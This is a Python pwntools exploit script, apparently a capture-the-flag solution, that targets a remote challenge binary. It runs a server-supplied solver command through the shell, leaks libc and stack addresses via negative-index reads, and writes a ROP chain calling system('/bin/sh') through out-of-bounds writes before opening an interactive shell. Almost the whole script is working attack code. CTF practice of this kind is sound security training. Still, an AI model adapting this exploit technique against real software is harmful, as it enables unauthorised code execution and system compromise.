#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore")
import subprocess

exe = ELF("./pacipace")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
# context.log_level='debug'
# context.terminal = ["foot"]
p = remote("pacipac.chal.crewc.tf", 1337)
p.recvuntil("the solver with:")
shell = p.recvuntil("===================",drop=True)
key = subprocess.check_output(shell,shell=True)
p.sendlineafter("Solution?",key)
def gdbs():
    gdb.attach(p, gdbscript="""
    brva 0x00000000000018F6

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
offset = [
        0xebc81,
        0xebc85,
        0xebc88,
        0xebce2,
        0xebd38,
        0xebd3f,
        0xebd43,
        ]
def writes(pos,addr):
    sla(">","2")
    sla(":",str(pos))
    sla(":",str(addr))
def add(idx,data="lmao"):
    sla(">",b"3")
    sla(":",str(idx))
    sa(":",data)
def dels(idx): 
    sla(">",b"4")
    sla(":",str(idx))
# for i in range(len(offset)):
# p = process([exe.path])
sla(">","1")
sla(":","-17")
p.recvuntil("e book in index -17 is ")
addr = int(p.recvuntil("1.",drop=True))
libc.address = addr - 0x80faa
pop_rdi = libc.address + 0x000000000002a3e5
log.info(f"addr: {hex(addr)}")
add_ = libc.address + 0x000000000007dfb1
ret = libc.address + 0x0000000000029139
add(0,b"aaaa")
dels(0)
sla(">","1")
sla(":","-216")
p.recvuntil("e book in index -216 is ")
addr = int(p.recvuntil("1.",drop=True))
log.info(f"addr: {hex(addr)}")
stack = addr - 0x1fde0
fakerbp = stack +0x20490-8
# gdbs()
writes(1,ret)
writes(2,pop_rdi)
writes(3,libc.search(b"/bin/sh").__next__())
writes(4,libc.sym.system)
writes(-5,add_)
# writes(-5,pop_rdi)
# writes(-6,fakerbp)
# writes(1)
p.interactive()









# good luck pwning :)

